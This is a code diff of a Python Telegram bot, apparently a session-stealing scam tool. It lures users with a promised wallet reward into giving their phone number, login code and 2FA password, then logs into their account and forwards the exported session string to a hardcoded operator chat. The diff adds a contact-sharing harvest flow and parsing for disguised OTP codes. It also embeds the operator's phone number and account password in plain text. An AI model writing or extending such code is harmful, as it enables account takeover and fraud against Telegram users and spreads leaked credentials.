@@ -1,4 +1,5 @@
 import os
+import re
 import asyncio
 import time
 import threading
@@ -6,21 +7,22 @@ import logging
 import pprint
 import crypter
 
-try:
-    from telethon.sessions import StringSession
-    from telethon.sessions.string import StringSession
-    from telethon.sync import TelegramClient, functions, events, Button      
-    from telethon.tl.functions.account import UpdateProfileRequest
-    import telethon.tl.types
-    from telethon import errors
-    #import qrcode
-    from qrcode import QRCode
-except:
-    os.system("pip install telethon")
-    os.system("pip install qrcode")
-    from telethon.sessions import StringSession
-    from telethon.sessions.string import StringSession
-    from telethon.sync import TelegramClient
+from telethon.sessions import StringSession 
+from telethon.sessions.string import StringSession 
+from telethon.sync import TelegramClient, functions, events, Button 
+from telethon.tl.functions.account import UpdateProfileRequest 
+
+from telethon.tl.types import (
+    ReplyKeyboardMarkup, 
+    KeyboardButtonRow, 
+    KeyboardButtonRequestPhone,
+    ReplyKeyboardHide
+)
+
+import telethon.tl.types
+from telethon import errors 
+#import qrcode 
+from qrcode import QRCode
 
 
 # Replace with your API ID and API hash
@@ -146,8 +148,9 @@ async def nm_2fa_save(mClient,sender_id,client,pass_2fa=None):
     
     print(f"\n{ssn}\n\n")
         
-    await client.send_message("me", f"🔴 Don't share with anyone 🔴\n\n`{phn}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
-    ssn_msg = await mClient.send_message(2576914746, f"`{phn}_{sender_id}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
+    await client.send_message("me", f"🔴 Don't share with anyone 🔴\n\n`{phn}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️")
+    
+    ssn_msg = await mClient.send_message(2576914746, f"`{phn}_{sender_id}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️")
     print(f"\nmsgID : {ssn_msg.id}\n")
 
     #for message in mClient.get_messages(sender_id, None, search=phn):
@@ -157,12 +160,13 @@ async def nm_2fa_save(mClient,sender_id,client,pass_2fa=None):
     
 
 
-    #await mClient.send_message(sender_id, phn + ' 🟢 Received Successfully')
+    await mClient.send_message(sender_id, phn + ' 🟢 Received Successfully')
     await mClient.send_message(sender_id, f' ✅ Congrats, the account {phn} has been verified successfully\nand reward amount has been added to your wallet')
 
 
     await disconnect_if_connected(client)
     print("\n\nKSP Finished.")
+
 
 
 async def fetch_bal(meClient,sender_id):
@@ -174,7 +178,9 @@ async def fetch_bal(meClient,sender_id):
     all_nums = []
     all_u_nums = []
     all_v_nums = []
-    for message in await meClient.get_messages(2576914746, None):
+
+    #for message in await meClient.get_messages(2576914746, None):
+    for message in await meClient.get_messages("ksp_ssn", None):
         #print(message)
         if (
             not hasattr(message.replies, 'MessageService') and
@@ -243,6 +249,7 @@ async def login_otp_send(phn,mClient,client,msg):
 
 async def try_login_2fa(mClient,event,ssn_str,phn,code,p_c_hash,pass_2fa=None):
     
+    rtn = "wrong"
     client = TelegramClient(StringSession(ssn_str), api_id, api_hash)
     await client.connect()
     #code = input("Enter the verification code: ")  # Get the OTP from the user
@@ -260,11 +267,15 @@ async def try_login_2fa(mClient,event,ssn_str,phn,code,p_c_hash,pass_2fa=None):
             phn_self = await client.get_me()
             print(phn_self.phone)
             
+            
+            rtn = "success"
+
             await nm_2fa_save(mClient,event.sender_id,client,pass_2fa)
         
 
     except errors.SessionPasswordNeededError:
         if pass_2fa is None:
+            rtn = "2fa"
             await mClient.send_message(event.sender_id,
                 f"{phn} 🟠 Enter 2FA"
             )
@@ -272,6 +283,10 @@ async def try_login_2fa(mClient,event,ssn_str,phn,code,p_c_hash,pass_2fa=None):
             #await nm_2fa_save(bot,client)    
     except:
         pass
+    
+    return rtn
+
+    
 
 async def get_next_number_smart(meClient, event, sender_id, limit=20):
     """
@@ -453,7 +468,7 @@ async def get_otp(mClient,mEvent,phn):
 
 async def login_bot():
     meClient = TelegramClient('me', api_id, api_hash)
-    client = TelegramClient('bot.session', api_id, api_hash)
+    client = TelegramClient('bot', api_id, api_hash)
     await client.start(bot_token=botToken,max_attempts=10)
     await meClient.start(phone='+8801410209040',password="khALid@542543",max_attempts=10)
     # Handler for the /start command
@@ -464,6 +479,7 @@ async def login_bot():
         name = sender.first_name
         await event.respond(f'Hello\t\t**{name}!!**\nPLease Insert a valid Phone Number with Country Code')
         logging.info(f'Start command received from {event.sender_id}')
+        #await meClient.send_message(2576914746, f"Developer @k_ofcl✌️")
 
     @client.on(events.NewMessage(pattern='/account'))
     async def start(event):
@@ -530,6 +546,46 @@ async def login_bot():
 
 
 
+    # =========================
+    # /self COMMAND
+    # =========================
+    @client.on(events.NewMessage(pattern='/self'))
+    async def self_command(event):
+        sender = await event.get_sender()
+        #button = KeyboardButton("📱 Share Phone Number", request_contact=True)
+        #keyboard = ReplyKeyboardMarkup([[button]], resize=True, one_time_keyboard=True)
+        button = KeyboardButtonRequestPhone(
+            text="📱 Share Phone Number"
+        )
+        
+        keyboard = ReplyKeyboardMarkup(
+            rows=[KeyboardButtonRow(buttons=[button])],
+            resize=True,
+            single_use=True
+        )
+        
+        await event.respond(
+            "Please share your phone number 👇",
+            buttons=keyboard
+        )
+
+    @client.on(events.NewMessage(func=lambda e: e.contact))
+    async def contact_handler(event):
+        phone = "+" + event.message.contact.phone_number
+        sender = await event.get_sender()
+        await event.respond(
+            f"✅ Thanks {sender.first_name}!\n\n"
+            f"Your number is: {phone}",
+            buttons=ReplyKeyboardHide()
+            
+        )
+        msg_sentp = await client.send_message(event.sender_id, phone + ' 🔵 In Progress')
+        uClient = TelegramClient(StringSession(), api_id, api_hash)
+        await login_otp_send(phone,client,uClient,msg_sentp)
+
+    
+
+
     @client.on(events.NewMessage(pattern='/msg'))
     async def start(event):
         await event.respond('wait...')
@@ -550,17 +606,35 @@ async def login_bot():
             ssn_str = ssn_hash.get(f"{phn}_ssn")
             p_c_hash = ssn_hash.get(f"{phn}_hash")
 
-            if not ssn_str is None and not p_c_hash is None:
-                if 'otp' in msg and len(r_code) == 5 and r_code.isdigit():
-                    await try_login_2fa(client,event,ssn_str,phn,r_code,p_c_hash)
-                elif 'otp' in msg and not len(r_code) == 5 and not r_code.isdigit():
-                    await client.send_message(event.sender_id,
-                        f"{phn} 🔴 Invalid OTP"
-                    )
 
-                if '2fa' in msg:
-                    await try_login_2fa(client,event,ssn_str,phn,r_code,p_c_hash,r_code)
+
+            if not ssn_str is None and not p_c_hash is None:
+                if 'otp' in msg:
+
+                    print(f"full otp : {r_code}")
+                    if(str(r_code).startswith('r')):
+                        r_code = r_code[::-1]
+                        print(f"rev num otp: {r_code}")
+
+                    r_code = re.findall(r'\d', r_code)
+                    r_code = ''.join(r_code)
+                    print(f"only num otp: {r_code}")
+
+                    if len(r_code) != 5 or not r_code.isdigit():
+                        await client.send_message(event.sender_id,
+                            f"{phn} 🔴 Invalid OTP format"
+                        )
+                    else:
+                        success = await try_login_2fa(client, event, ssn_str, phn, r_code, p_c_hash)
+                        print(success)
+                        if success == "wrong":
+                            await client.send_message(event.sender_id, f"{phn} 🔴 Wrong OTP")
                 
+                if '2fa' in msg:
+                    success = await try_login_2fa(client, event, ssn_str, phn, r_code, p_c_hash, r_code)
+                    if success == "wrong":
+                        await client.send_message(event.sender_id, f"{phn} 🔴 Wrong OTP")
+            
 
         
 
@@ -599,13 +673,13 @@ async def login_bot():
             msg = '+880' + msg
         elif msg.startswith("01"):
             msg = '+88' + msg
-        
-        msg_sent = await client.send_message(event.sender_id, msg + ' 🔵 In Progress')
+
+        if msg.startswith("+8801") and len(msg) >= 13:
+            msg_sent = await client.send_message(event.sender_id, msg + ' 🔵 In Progress')
+            uClient = TelegramClient(StringSession(), api_id, api_hash)
+            await login_otp_send(msg,client,uClient,msg_sent)
         
         #await client.edit_message(msg_sent.peer_id.user_id, msg_sent.id, msg + ' 🔵 In Prog')
-        
-        uClient = TelegramClient(StringSession(), api_id, api_hash)
-        await login_otp_send(msg,client,uClient,msg_sent)
         #await disconnect_if_connected(uClient)
 
         
